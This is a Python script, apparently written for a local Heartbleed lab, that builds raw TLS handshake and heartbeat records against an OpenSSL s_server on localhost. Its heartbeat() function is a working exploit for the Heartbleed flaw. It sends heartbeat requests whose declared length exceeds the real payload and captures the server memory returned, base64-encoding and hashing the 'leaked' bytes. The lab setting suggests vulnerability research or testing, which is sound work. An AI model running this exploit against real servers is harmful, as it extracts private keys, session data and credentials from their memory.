"""Independent RFC 5246/6520 framing against unchanged upstream s_server."""
from pathlib import Path
import base64
import hashlib
import json
import os
import socket
import ssl
import struct
import subprocess
import time

root = Path('/tmp/heartbleed-lab')
providers = json.loads((root / 'providers.json').read_text())
def exact(stream, length):
    result = b''
    while len(result) < length:
        part = stream.recv(length - len(result))
        if not part:
            raise EOFError('TLS record ended early')
        result += part
    return result


def frame(stream):
    header = exact(stream, 5)
    kind, version, length = struct.unpack('!BHH', header)
    assert length <= 18432
    return kind, version, exact(stream, length)


def send(stream, kind, version, data):
    stream.sendall(struct.pack('!BHH', kind, version, len(data)) + data)


def client_hello(version, ciphers=b'\x00\x2f'):
    extension = struct.pack('!HHB', 15, 1, 1)
    hello = struct.pack('!H', version) + os.urandom(32) + b'\x00' + struct.pack('!H', len(ciphers)) + ciphers + b'\x01\x00' + struct.pack('!H', len(extension)) + extension
    return b'\x01' + len(hello).to_bytes(3, 'big') + hello


def negotiate(stream, version, ciphers=b'\x00\x2f'):
    send(stream, 22, version, client_hello(version, ciphers))
    pending = b''
    done = False
    received = []
    while not done:
        kind, server_version, data = frame(stream)
        received.append({'type': kind, 'version': server_version, 'length': len(data)})
        assert kind == 22, (kind, data.hex())
        pending += data
        while len(pending) >= 4:
            length = int.from_bytes(pending[1:4], 'big')
            if len(pending) < 4 + length:
                break
            done = pending[0] == 14
            pending = pending[4 + length:]
    return received


def buffering_control(port):
    small = b'heartbeat-native-control'
    large = b'V' * 8192
    with socket.create_connection(('127.0.0.1', port), timeout=2) as stream:
        stream.settimeout(1.2)
        negotiate(stream, 0x0301)
        send(stream, 24, 0x0301, b'\x01' + struct.pack('!H', len(small)) + small + os.urandom(16))
        stream.settimeout(0.3)
        try:
            initial = frame(stream)
        except socket.timeout:
            initial = None
        stream.settimeout(1.2)
        send(stream, 24, 0x0301, b'\x01' + struct.pack('!H', len(large)) + large + os.urandom(16))
        responses = [initial] if initial else []
        while len(responses) < 2:
            responses.append(frame(stream))
        payloads = []
        for kind, version, data in responses:
            assert kind == 24 and version == 0x0301 and data[0] == 2
            length = int.from_bytes(data[1:3], 'big')
            payloads.append(data[3:3 + length])
        assert payloads == [small, large], [len(part) for part in payloads]
        return {'small_response_before_large_request': initial is not None, 'echo_payload_sizes': [len(part) for part in payloads], 'both_exact_echoes': True, 'interpretation': 'Handshake buffering delayed the small valid echo until a larger valid heartbeat flushed it' if initial is None else 'Both valid echoes were immediate'}


def heartbeat(port, version, declared, valid=False, upgrade=None, ciphers=b'\x00\x2f'):
    challenge = b'V' * 8192 if valid else b''
    with socket.create_connection(('127.0.0.1', port), timeout=2) as stream:
        stream.settimeout(1.2)
        if upgrade is not None:
            upgrade(stream)
        received = negotiate(stream, version, ciphers)
        payload = b'\x01' + struct.pack('!H', len(challenge) if valid else declared) + challenge + (os.urandom(16) if valid else b'')
        send(stream, 24, version, payload)
        body = b''
        try:
            while len(body) < 3 + (len(challenge) if valid else declared) + 16:
                kind, server_version, data = frame(stream)
                received.append({'type': kind, 'version': server_version, 'length': len(data)})
                if kind != 24:
                    return {'response_type': kind, 'alert_hex': data.hex() if kind == 21 else None, 'records': received}
                body += data
        except (socket.timeout, EOFError) as error:
            return {'ignored': isinstance(error, socket.timeout), 'closed_early': isinstance(error, EOFError), 'partial_base64': base64.b64encode(body).decode(), 'records': received}
        assert body[0] == 2
        length = int.from_bytes(body[1:3], 'big')
        leaked = body[3:3 + length]
        assert len(leaked) == length
        return {'declared': length, 'received_payload_bytes': len(leaked), 'payload_base64': base64.b64encode(leaked).decode(), 'payload_sha256': hashlib.sha256(leaked).hexdigest(), 'valid_echo': leaked == challenge, 'extra_bytes': max(0, len(leaked) - len(challenge)), 'records': received}


